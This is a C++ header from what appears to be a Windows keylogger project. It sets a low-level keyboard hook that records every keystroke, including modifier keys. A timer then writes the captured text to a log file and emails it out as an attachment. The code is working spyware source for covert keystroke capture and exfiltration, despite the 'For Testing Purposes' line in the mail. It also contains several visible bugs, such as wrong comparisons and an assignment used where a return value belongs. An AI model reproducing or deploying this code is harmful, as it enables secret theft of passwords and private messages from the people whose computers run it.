#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include<iostream>
#include<fstream>
#include "windows.h"
#include "KeyConstants.h"

std::string keylog = "";

void TimerSendMail()
{
    if(keylog.empty()) return;
    std::string lastFile = IO::WriteLog(keylog);

    if(lastFile.empty())
    {
        Helper::WriteAppLog("File creation was not successful. Keylog'"+keylog+"'");
        return;
    }
    int x = Mail::SendMail("Log ["+ lastFile + "]", "Hi :) /n the file has been attached to this mail \n For Testing Purposes"+ keylog,IO::GetOurPath(true)+lastFile);
    if(x!=7)
    {
        Helper::WriteAppLog("Mail was not sent Error Code: "+ Helper::ToString(x));
    }
    else
    {
     keylog="";
    }


}
Timer MailTimer(TimerSendMail,500*60, Timer::Infinite);

HHOOK eHook=NULL;
LRESULT ourKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode<0)
    {
        CallNextHookEx(eHook,nCode,wparam,lparam);
    }
    KBDLLHOOKSTRUCT *kbs=(KBDLLHOOKSTRUCT *)lparam;
    if(wparam==WM_KEYDOWN|| WM_KEYDOWN==WM_SYSKEYDOWN)
    {
        keylog+=Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN)
        {
            keylog+='\n';
        }
    }
    else if(wparam==WM_KEYUP || wparam==WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key==VK_CONTROL|| key == VK_LCONTROL || key ==VK_RCONTROL || key==VK_SHIFT || key ==VK_RSHIFT || key==VK_LSHIFT
           || key==VK_MENU || key==VK_LMENU||key==VK_RMENU||key==VK_CAPITAL||key==VK_NUMLOCK||key==VK_LWIN||key==VK_RWIN)
        {
            std::string keyname= Keys::KEYS[kbs->vkCode].Name;
            keyname.insert(1,"/");
            keylog+=keyname;
        }
        return CallNextHookEx(eHook,nCode,lparam,wparam);
    }
}
bool InstallHook()
{
    Helper::WriteAppLog("Hook started");
    MailTimer.Start(true);
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)ourKeyboardProc,GetModuleHandle(NULL),0);
    return eHook=NULL;
}
bool UninstallHook()
{
    bool b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool) (eHook==NULL);
}

#endif
